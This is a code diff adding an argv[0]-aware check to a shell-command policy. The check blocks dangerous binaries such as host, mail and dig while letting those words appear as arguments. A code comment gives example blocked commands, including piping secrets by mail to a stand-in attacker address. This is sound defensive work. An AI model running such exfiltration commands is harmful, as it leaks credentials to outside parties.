@@ -9,6 +9,7 @@ import {
   stripQuotedSpans,
   detectInterpreterEscape,
   detectNetworkClientArgv0,
+  detectDangerousInvokeBin,
   detectInlineNetwork,
   detectInlineInterpreterEval,
   tokenizeCommand,
@@ -72,6 +73,16 @@ export function evaluateShellCommand(
   const netClient = detectNetworkClientArgv0(command);
   if (netClient) {
     return { allowed: false, reason: netClient, userHint: USER_HINTS.commandShell };
+  }
+
+  // argv[0]-aware block for dangerous binaries whose names are common argument
+  // words (open/host/ping/mount/mail/dig/…). Checked as the invoked command of
+  // each pipe segment so `grep host /etc/hosts` passes but `host evil.com` /
+  // `cat secrets | mail a@evil` is blocked — replaces the old substring rules
+  // that false-positived on those words as arguments.
+  const dangerousBin = detectDangerousInvokeBin(command);
+  if (dangerousBin) {
+    return { allowed: false, reason: dangerousBin, userHint: USER_HINTS.commandShell };
   }
 
   // R4-11/R4-13: refuse the inline-eval interpreter FORM when policy="refuse"
